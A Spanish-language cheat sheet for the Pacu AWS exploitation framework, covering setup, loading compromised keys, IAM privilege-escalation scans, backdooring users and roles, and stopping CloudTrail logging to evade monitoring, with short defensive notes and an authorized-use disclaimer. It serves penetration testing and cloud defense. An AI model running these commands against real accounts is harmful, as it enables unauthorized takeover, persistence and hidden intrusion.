<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="centro">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Laboratorios de seguridad de Rhino">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Seguridad en la nube">
</p>

<p align="centro">
  <b>☁️ El marco de explotación de AWS de código abierto diseñado para pruebas de penetración en entornos de nube, escalada de privilegios, recolección de credenciales y reconocimiento de infraestructura</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitectura] (#-descripción general--arquitectura)
- [Instalación](#-instalación)
- [Administración de sesiones e importación de claves de AWS] (#-session-management--aws-key-import)
  - [Importación de credenciales comprometidas](#importación-credenciales-comprometidas)
  - [Roles asumidos y tokens de sesión](#roles-asumidos-y-tokens-de-sesión)
- [Módulos de reconocimiento y enumeración](#-reconnaissance--enumeration-modules)
  - [Enumeración de permisos de IAM actuales](#enumeración-de-permisos-de-iam-actuales)
  - [Escaneo de instancias EC2 y depósitos S3](#scanning-ec2-instances--s3-buckets)
- [Técnicas de escalada de privilegios en AWS](#-técnicas-de-escalada-de-privilegios-en-aws)
  - [Escáner de escalada automática de privilegios] (#escáner-de-escalada-de-privilegios-automático)
  - [Ejecutando módulos de escalamiento](#ejecutando-módulos-de-escalamiento)
- [Persistencia y evasión de defensa] (#-persistencia--evasión-defensa)
  - [Usuarios y roles de IAM con puertas traseras](#backdooring-iam-roles--users)
  - [Interrupción del registro de CloudTrail] (#disrupting-cloudtrail-logging)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y arquitectura

Creado por **Rhino Security Labs**, **Pacu** es el "Metasploit para AWS". Está diseñado para emular tácticas adversas dentro de los entornos de Amazon Web Services.

Pacu opera utilizando una base de datos SQLite local que mantiene el estado durante las sesiones ofensivas:
- **Modular Pipeline:** Más de 40 módulos especializados que cubren descubrimiento, movimiento lateral, escalada de privilegios, persistencia y exfiltración.
- **Enumeración de permisos:** Analiza las políticas de IAM sin activar umbrales de alerta probando acciones de API o revisando las políticas administradas adjuntas.
- **Privesc Automation:** Evalúa rutas conocidas de escalada de permisos de IAM (como `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Instalación
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Gestión de sesiones e importación de claves de AWS

Cuando se inicia Pacu, ingresas a una consola interactiva. Crea o selecciona una sesión:
```text
Pacu > set_session client_assessment
```
### Importación de credenciales comprometidas
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Roles asumidos y tokens de sesión
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Módulos de reconocimiento y enumeración

### Enumeración de permisos de IAM actuales
Determine quién es usted y qué pueden hacer las credenciales activas:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Escaneo de instancias EC2 y depósitos S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Técnicas de escalada de privilegios en AWS

La escalada de privilegios de AWS se basa en políticas de IAM mal configuradas que permiten a los usuarios no administrativos otorgarse a sí mismos o a otras entidades derechos administrativos.

### Escáner de escalada automática de privilegios
Analiza sus permisos enumerados con más de 21 vectores privados de AWS documentados:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*El resultado de muestra destaca permisos vulnerables como `iam:PutUserPolicy`, `iam:AttachUserPolicy` o `iam:CreateAccessKey`.*

### Ejecución de módulos de escalamiento
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Persistencia y evasión de defensa

### Funciones y usuarios de IAM con puertas traseras
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Interrupción del registro de CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando Pacu |
|-----------|--------------|
| **Establecer/Seleccionar sesión** | `set_session <NAME>` |
| **Importar credenciales de AWS** | `set_keys` |
| **Mostrar identidad actual** | `whoami` |
| **Enumerar derechos de IAM** | `run iam__enum_permissions` |
| **Escanear en busca de vectores privados** | `run iam__privesc_scan` |
| **Enumerar depósitos S3** | `run s3__enum` |
| **Enumerar instancias EC2** | `run ec2__enum` |
| **Interrumpir CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Lista de módulos disponibles** | `list` |

---

## 🛡️ Consideraciones defensivas y detección

1. **GuardDuty y monitoreo de CloudTrail:** La escalada de privilegios automatizada y el escaneo de permisos de Pacu generan consultas API secuenciales rápidas que AWS GuardDuty marca fácilmente.
2. **SCP y límites de permisos:** Aplique las políticas de control de servicios (SCP) de AWS Organizations para evitar que cualquier entidad principal (incluidos los administradores completos) altere CloudTrail o modifique las estructuras organizativas raíz.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Pacu está diseñado específicamente para pruebas de penetración y evaluaciones de seguridad autorizadas de AWS. Probar cuentas en la nube sin el permiso previo explícito del propietario del activo viola la Política de uso aceptable de los servicios web de Amazon y el derecho internacional.